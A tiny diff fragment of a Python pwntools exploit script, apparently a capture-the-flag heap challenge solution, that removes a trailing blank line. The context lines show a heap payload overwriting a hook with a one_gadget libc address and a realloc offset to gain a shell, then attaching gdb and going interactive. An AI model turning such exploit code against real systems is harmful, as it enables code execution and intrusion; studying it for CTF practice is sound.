@@ -61,4 +61,3 @@ if __name__ == "__main__":
   add(0x68, 'a' * (0x13 - 0x8) + p64(og[3] + libc) + p64(libc + realloc + 4))
   gdb.attach(p)
   p.interactive()
-
